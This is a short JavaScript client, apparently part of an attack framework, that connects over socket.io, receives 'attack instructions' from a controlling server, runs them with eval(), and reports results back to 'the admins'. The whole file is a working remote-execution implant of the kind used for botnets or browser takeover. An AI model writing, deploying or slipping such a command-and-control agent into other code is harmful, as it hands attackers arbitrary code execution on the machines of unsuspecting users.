var socket = io();

socket.on('execute', function(data){
  var result;

  try{
    //attack instructions are passed in with socket emission
    eval(data.func);
  }catch(e){
    result = {
      //default to failed, status is updated when evaluating data.func
      status: 'Failed to execute attack module',
      err: e
    }
  }

  //data.func updates result which we send back to the admins
  socket.emit('result', result);
});
